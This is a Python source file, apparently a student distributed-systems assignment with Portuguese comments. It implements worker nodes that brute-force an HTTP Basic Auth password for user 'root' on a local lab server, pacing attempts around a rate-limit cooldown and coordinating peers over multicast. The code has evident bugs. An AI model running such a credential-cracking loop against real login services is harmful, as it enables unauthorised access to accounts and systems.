
"""
O slave que estavamos a tentar desenvolver
"""

import sys
from typing import Counter
from const import COOLDOWN_TIME, MIN_TRIES, PASSWORD_SIZE
import time
import socket
import base64
import struct
import json

SERVER_HOST = "172.17.0.2"
SERVER_PORT = 8000
USER = 'root'

MCAST_GRP = '224.1.1.1'
MCAST_PORT = 5007
MULTICAST_TTL = 2

class Slave:

    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    recover_password = [-1]
    last_password = [-1]
    current_size = 1

    """ Inicialização do slave (declaração das sockets precisas) """
    def __init__(self): 

        self.slaves_info = []
        self.cache = []
        self.number_of_tries = 0
        self.last_id = False
        self.id = id(self)
        print("MY ID IS!!!!!!!!!!!!!!!!!!!")
        print(self.id)

        # SOCKET DO SERVIDOR
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.connect((SERVER_HOST, SERVER_PORT))
        print("Connected to:" ,(SERVER_HOST,SERVER_PORT))

        # SOCKET DO MULTICAST GROUP (SLAVES)
        self.multicast_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        self.multicast_sock.bind((MCAST_GRP, MCAST_PORT))
        mreq = struct.pack("4sl", socket.inet_aton(MCAST_GRP), socket.INADDR_ANY)
        self.multicast_sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        self.ip = socket.gethostbyname(socket.gethostname())
        print("My ip is" , self.ip)


    def alive(self):

        alive_message = {"id" : self.id}
        print(alive_message)
        data = json.dumps(alive_message).encode('utf-8')
        message_size = str(len(data))                            
        size_header = len(message_size)                                          
        newheader =  'f'*(4-size_header) + message_size    
        print(newheader)    
        self.multicast_sock.sendto(newheader.encode('utf-8'), (MCAST_GRP, MCAST_PORT))
        self.multicast_sock.sendto(data, (MCAST_GRP, MCAST_PORT))

        # se receber mensagem do grupo multicast é porque já existem slaves no grupo, caso contrário este é o único (e passa a ser o elemento central no P2P)
        self.comparator_info_slaves = {}
        self.reestructure = False
        self.slave_info()

        #vai ver se houve algum slave que se desconetou
        for key in self.slaves_info:
            if key not in self.comparator_info_slaves:
                self.reestructure = True
                self.slaves_info.remove(key)

        if self.reestructure == True:
            self.reestruct_algorithm()


    def reestruct_algorithm(self):

        print("reestruct")

        self.increment = 1
        for slave in self.slaves_info:
            if slave < id:
                self.increment += 1
        
        if self.increment == self.slaves_info:
            self.last_id = True                  #se for true ele pode fazer overwrite da ultima password
        
    def slave_info(self):

        print("slave_info")

        header = self.multicast_sock.recv(4)    #problema: ele fica parado aqui e assume que vai receber informação
        print(header)       
        if header:                      

            header = header.decode('utf-8').replace('f','')  
            print(header)
            data = self.multicast_sock.recv(int(header))
            print(data)

            data = data.decode('utf-8')
            data = json.loads(data)

            print("Data:")
            print(data)
            slave_id = data["id"]

            #nova socket que coneta o slave atual a outro slave existente e adiciona ao dicionário
            if (slave_id not in self.slaves_info):
                self.slaves_info.append(slave_id) #adiciona um novo camarada
                print("novo slave recebido: " + str(slave_id))
            else:
                self.comparator_info_slaves.append(slave_id)

            print("return true")
            return True
        else:
            print("return false")
            return False

    """ Gerar uma password com PASSWORD_SIZE caracteres"""
    def generate_password(self):

        print("a gerar pass")

        current_password = self.last_password
        for i in range(self.current_size-1,-1,-1):
            if i == self.current_size-1:
                value = current_password[i] + self.increment
                if value >= len(Slave.characters):
                    current_password[i] = value % len(Slave.characters)
                    if (i == 0):
                        current_password.insert(0,0)
                    else:
                        current_password[i-1] += 1
                else:
                    current_password[i] = value
            elif i == 0 and i != self.current_size-1:
                if current_password[i] >= len(Slave.characters):
                    current_password.insert(0,0)
            else:
                if current_password[i] >= len(Slave.characters):
                    current_password[i-1] += 1

        if self.last_id:
            self.recover_password = self.last_password
            self.last_password = current_password

        password = ''.join(Slave.characters[x] for x in current_password)
        print("password:")
        print(password)
        return password


    def deliver(self,password):

        print("=== SENDING ===")
        print("Password: " + password)
        token = base64.encodebytes(('%s:%s' % (USER, password)).encode()).strip()
        self.cache.append(password)
        lines = 'GET / HTTP/1.1\nHost: %s\nAuthorization: Basic %s\n\n' % ( SERVER_HOST, token.decode())
        self.server_sock.send(lines.encode('utf-8'))


    def receive(self):
        try :
            rcv = self.server_sock.recv(4024).decode('utf-8')
        except UnicodeDecodeError:
            print("Password found! ")
            print(self.cache.pop(len(self.cache) -2))
            return False
        return True

    """ Vai estar sempre a correr e a invocar o deliver / receive até ao momento em que a password é desvendada """
    def run(self):

        cracking_password = True
        while cracking_password:

            if (self.number_of_tries < MIN_TRIES):
                password = self.generate_password()
                self.deliver(password)
                self.number_of_tries += 1
            else:
                print("=== Waiting for cooldown time ===")
                time.sleep(COOLDOWN_TIME/1000)
                self.number_of_tries = 0
        
            cracking_password = self.receive()
            time.sleep(0.1)
        
        #notificar todos os slaves que foi desconetado
        self.server_sock.close()
        self.multicast_sock.close()
        sys.exit("Password was cracked! Closing the slave..")


if __name__ == "__main__":

    slave = Slave()
    print("aqui1")
    while True:
        print("alive")
        slave.alive()
        print("run")
        slave.run()